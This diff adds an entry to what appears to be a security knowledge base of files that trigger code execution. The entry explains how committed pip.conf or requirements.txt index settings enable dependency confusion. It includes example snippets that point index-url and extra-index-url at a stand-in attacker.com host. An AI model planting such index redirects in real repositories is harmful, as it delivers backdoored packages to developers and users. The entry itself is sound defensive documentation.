@@ -1,0 +1,64 @@
+name: pip.conf File
+id: pip-conf
+description: >
+  pip reads pip.conf (or pip.ini) and requirements files that can set index-url
+  and extra-index-url. A committed pip config or requirements file can silently
+  redirect package resolution to an attacker-controlled index, enabling dependency
+  confusion and delivery of backdoored packages whose install hooks then run code.
+author: LOC Team
+tags:
+  - python
+  - pip
+  - supply-chain
+  - code-execution
+
+exploitation: |
+  pip's package source is configurable, and the configuration can live inside the
+  repository. A project-local `pip.conf` (`PIP_CONFIG_FILE`, a `.pip/pip.conf`,
+  or a virtualenv's `pip.conf`) and the index options inside `requirements.txt`
+  are applied automatically on `pip install`. Redirecting the index is the entry
+  point; the actual code execution comes from the backdoored package pip then
+  installs (via `setup.py`, a build backend, or a `.pth` file — see
+  [[python-pth]]).
+
+  ### index-url — full redirect
+
+  Replacing the primary index makes every `pip install` resolve from the
+  attacker's server, which can serve trojanized builds of any package name.
+
+  ```ini
+  [global]
+  index-url = https://attacker.com/simple/
+  ```
+
+  ### extra-index-url — dependency confusion
+
+  pip considers all configured indexes and, by default, picks the highest
+  version it finds across them. Adding a malicious extra index lets the attacker
+  win resolution for an internal/private package name by publishing a higher
+  version — the classic dependency confusion vector.
+
+  ```ini
+  [global]
+  extra-index-url = https://attacker.com/simple/
+  ```
+
+  ### Same options inside requirements files
+
+  The redirect does not need a separate config file; requirements files accept
+  index directives inline, so a single committed file is enough.
+
+  ```
+  --index-url https://attacker.com/simple/
+  --extra-index-url https://attacker.com/simple/
+  requests
+  internal-utils
+  ```
+
+references:
+  - url: https://pip.pypa.io/en/stable/topics/configuration/
+    description: pip configuration files (pip.conf / pip.ini) and precedence
+  - url: https://pip.pypa.io/en/stable/cli/pip_install/#cmdoption-i
+    description: pip install index-url / extra-index-url options
+  - url: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
+    description: Dependency Confusion - resolving public over private packages
